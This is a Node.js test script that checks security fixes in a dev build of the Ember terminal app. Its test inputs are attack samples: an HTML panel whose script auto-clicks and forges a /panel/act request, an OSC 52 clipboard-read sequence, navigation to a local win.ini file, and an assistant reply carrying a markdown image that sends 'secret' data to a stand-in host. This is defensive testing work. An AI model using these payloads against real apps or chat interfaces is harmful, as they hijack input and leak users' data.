/**
 * The security fixes, checked against a running dev Ember (own EMBER_HOME, a plain
 * PowerShell tab, no agent):
 *
 *   1. An HTML panel that clicks its own button, or posts to /panel/act itself, types
 *      nothing into the tab. A real click on the same button does type (without Enter,
 *      since the tab is a shell).
 *   2. A terminal program asking for the clipboard (OSC 52 read) gets nothing back.
 *   3. The window does not navigate away to a file.
 *   4. A remote image in a reply is a placeholder until clicked.
 *
 * The only thing typed into the shell is the line that reads the bridge token, as in
 * probe-panel.mjs. No agent runs.
 *
 *   npm run build; node scripts/probe-security.mjs [out-dir]
 */
import { spawn } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

const REPO = new URL('..', import.meta.url).pathname.slice(1).replace(/\/$/, '')
const OUT = process.argv[2] ?? join(process.env.TEMP ?? '.', 'ember-security-shots')
const EMBER_HOME = join(process.env.TEMP ?? '.', `ember-probe-security${process.env.PROBE_TAG ?? ''}`)
rmSync(EMBER_HOME, { recursive: true, force: true })
mkdirSync(EMBER_HOME, { recursive: true })
mkdirSync(OUT, { recursive: true })
writeFileSync(join(EMBER_HOME, 'config.json'), JSON.stringify({ agent: { onboarded: true }, brain: { sync: false } }))
const PORT = Number(process.env.PROBE_PORT) || 9399
const child = spawn(join(REPO, 'node_modules/electron/dist/electron.exe'), ['.', `--remote-debugging-port=${PORT}`], {
  cwd: REPO,
  stdio: 'ignore',
  env: { ...process.env, EMBER_HOME, EMBER_PROBE_BOUNDS: '1280x900', EMBER_PROBE_INACTIVE: '1' },
})
const wait = (ms) => new Promise((r) => setTimeout(r, ms))
let failed = 0
const check = (name, ok, detail) => {
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  ${JSON.stringify(detail)}` : ''}`)
  if (!ok) failed++
}

try {
  let target
  for (let i = 0; i < 60 && !target; i++) {
    await wait(500)
    try {
      target = (await (await fetch(`http://127.0.0.1:${PORT}/json/list`)).json()).find((t) => t.type === 'page')
    } catch {}
  }
  const ws = new WebSocket(target.webSocketDebuggerUrl)
  await new Promise((r) => ws.addEventListener('open', r, { once: true }))
  let id = 0
  const pending = new Map()
  ws.addEventListener('message', (e) => {
    const m = JSON.parse(e.data)
    pending.get(m.id)?.(m.result ?? m.error)
    pending.delete(m.id)
  })
  const send = (method, params = {}) =>
    new Promise((r) => {
      pending.set(++id, r)
      ws.send(JSON.stringify({ id, method, params }))
    })
  const ev = async (expression) => (await send('Runtime.evaluate', { expression, returnByValue: true, awaitPromise: true }))?.result?.value
  const shot = async (name) => {
    const r = await send('Page.captureScreenshot', { format: 'png' })
    writeFileSync(join(OUT, `${name}.png`), Buffer.from(r.data, 'base64'))
  }
  const screen = (sid) =>
    ev(`(() => { const t = window.__ember.term(${JSON.stringify(sid)}), b = t.buffer.active, out = []
      for (let y = 0; y < b.length; y++) out.push(b.getLine(y)?.translateToString(true) ?? '')
      return out.join('\\n') })()`)

  await wait(5000)
  const first = await ev('window.__ember.activeTab()')
  const tab = await ev('window.__ember.newLoom()')
  await ev(`window.__ember.closeTab(${JSON.stringify(first)})`)
  await ev(`window.__ember.activate(${JSON.stringify(tab)})`)
  await wait(4000)
  const sid = await ev('window.__ember.sessions()[0].id')

  // The bridge token and tab id, read from the shell's own environment.
  const file = join(EMBER_HOME, 'token.txt')
  const line = `"$env:EMBER_TAB_ID|$env:EMBER_BRIDGE_TOKEN" | Set-Content -Encoding utf8 '${file.replace(/\\/g, '/')}'; cls`
  await ev(`window.ember.write(${JSON.stringify(sid)}, ${JSON.stringify(`${line}\r`)})`)
  let tabId = ''
  let token = ''
  for (let i = 0; i < 50 && !token; i++) {
    await wait(300)
    if (existsSync(file)) [tabId, token] = readFileSync(file, 'utf8').replace(/^\uFEFF/, '').trim().split('|')
  }
  const origin = await ev('window.ember.panel.origin()')
  if (!token || !origin) throw new Error(`no bridge: token=${!!token} origin=${origin}`)
  await wait(1500)

  // The canvas is shown by a stylesheet, as Claude mode would show it.
  await ev(`(() => { const st = document.createElement('style'); st.textContent = '.loom { display: block !important; height: 760px !important; }'; document.head.appendChild(st); return true })()`)

  // 1. An HTML panel that tries to act on its own.
  const html = `<!doctype html><html><body style="background:#222;color:#eee;font:16px sans-serif">
    <button id="b" data-ember-send="AUTOCLICKED" style="font-size:20px;padding:20px 40px">Press me</button>
    <button id="r" data-ember-send="REALCLICK" style="font-size:20px;padding:20px 40px">Real</button>
    <script>
      setTimeout(() => document.getElementById('b').click(), 300)
      setTimeout(() => {
        const s = [...document.scripts].map((x) => x.textContent).join(' ')
        const m = s.match(/ACT = "(\\w+)"/)
        fetch('/panel/act', { method: 'POST', headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ act: m ? m[1] : 'x', kind: 'send', text: 'FORGEDFETCH' }) })
      }, 600)
    </script></body></html>`
  const res = await fetch(`${origin}/panel`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-ember-token': token },
    body: JSON.stringify({ tabId, title: 'Attack page', format: 'html', content: html }),
  })
  check('bridge accepted the html push', res.ok, { status: res.status })
  await wait(3500)
  const after = await screen(sid)
  check('self-clicked button typed nothing', !after.includes('AUTOCLICKED'))
  check('forged /panel/act typed nothing', !after.includes('FORGEDFETCH'))

  // A real click on the "Real" button, wherever the frame is.
  const frame = await ev(`(() => {
    const f = [...document.querySelectorAll('iframe, webview')].find((x) => x.offsetParent && x.getBoundingClientRect().width > 50)
    if (!f) return null
    const r = f.getBoundingClientRect()
    return { tag: f.tagName, x: r.left, y: r.top, w: r.width, h: r.height }
  })()`)
  await shot('panel')
  if (frame) {
    // The second button sits right of the first, near the top of the page.
    const x = frame.x + 290
    const y = frame.y + 40
    await send('Input.dispatchMouseEvent', { type: 'mousePressed', x, y, button: 'left', clickCount: 1 })
    await send('Input.dispatchMouseEvent', { type: 'mouseReleased', x, y, button: 'left', clickCount: 1 })
    await wait(1500)
    const clicked = await screen(sid)
    check('a real click types its text', clicked.includes('REALCLICK'), { frame })
  } else check('a real click types its text', false, 'no panel frame on screen')
  await ev(`window.ember.write(${JSON.stringify(sid)}, '\\x1b')`)

  // 2. OSC 52 read: the clipboard holds a marker; the "program" asks for it.
  await ev(`navigator.clipboard.writeText('CLIPSECRET42').then(() => true, () => false)`)
  await ev(`(() => { window.__ember.term(${JSON.stringify(sid)}).write('\\x1b]52;c;?\\x07'); return true })()`)
  await wait(1500)
  check('OSC 52 read leaks nothing', !(await screen(sid)).includes('CLIPSECRET42'))

  // 3. Navigation away to a file.
  const before = await ev('location.href')
  await ev(`(() => { try { location.href = 'file:///C:/Windows/win.ini' } catch {} return true })()`)
  await wait(1500)
  let now = null
  for (let i = 0; i < 10 && !now; i++) {
    try {
      target = (await (await fetch(`http://127.0.0.1:${PORT}/json/list`)).json()).find((t) => t.type === 'page')
      now = target?.url
    } catch {}
    await wait(200)
  }
  check('window did not navigate to a file', now === before, { before, now })

  // 4. A remote image in a reply.
  const lines = [
    { type: 'user', uuid: 'u1', timestamp: '2026-11-03T09:00:00Z', message: { role: 'user', content: 'show it' } },
    { type: 'assistant', uuid: 'a1', timestamp: '2026-11-03T09:00:01Z', message: { role: 'assistant', content: [{ type: 'text', text: 'Here:\n\n![chart](https://example.com/leak.png?d=secret)' }] } },
  ]
  await ev(`window.__ember.loomFeed(${JSON.stringify(tab)}, ${JSON.stringify(lines)})`)
  await wait(1200)
  const img = await ev(`({ remote: document.querySelectorAll('.loom-say img[src^="https:"]').length, placeholder: document.querySelectorAll('.loom-img-remote').length })`)
  check('remote image not loaded until clicked', img.remote === 0 && img.placeholder === 1, img)
  await shot('image')

  ws.close()
} finally {
  spawn('taskkill', ['/PID', String(child.pid), '/T', '/F'], { stdio: 'ignore' })
  console.log(failed ? `${failed} failed` : 'all passed')
}
